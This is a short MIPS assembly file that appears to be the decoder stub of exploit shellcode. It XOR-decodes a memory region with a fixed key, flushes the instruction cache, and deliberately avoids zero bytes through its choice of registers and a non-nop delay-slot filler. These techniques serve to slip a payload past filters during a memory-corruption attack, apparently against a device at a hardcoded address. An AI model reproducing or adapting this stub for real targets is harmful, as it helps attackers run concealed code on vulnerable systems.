#.org 0x81789240 # roughly
#.noabicalls
.section text
.text

.equ START, 0x41
.equ END, 0x385 # way past the end!
.equ KEY, 0xfefefefe
start:
# use high number registers to avoid 0 bytes

.set noreorder # avoid nops inserted into delay slot
    li $a1, KEY

    li $s2, -START
    sub $s3, $s0, $s2 # start
    li $s2, -END
    sub $s4, $s0, $s2 # end

    li $a0, -4
loop:
    lw $t0, -1($s3)
    xor $t0, $t0, $a1
    sw $t0, -1($s3)
    synci -1($s3)

    sub $s3, $s3, $a0
    bne $s3, $s4, loop
    lui $a2, 0xc0c0 # branch delay slot nop (regular nop has 0's)
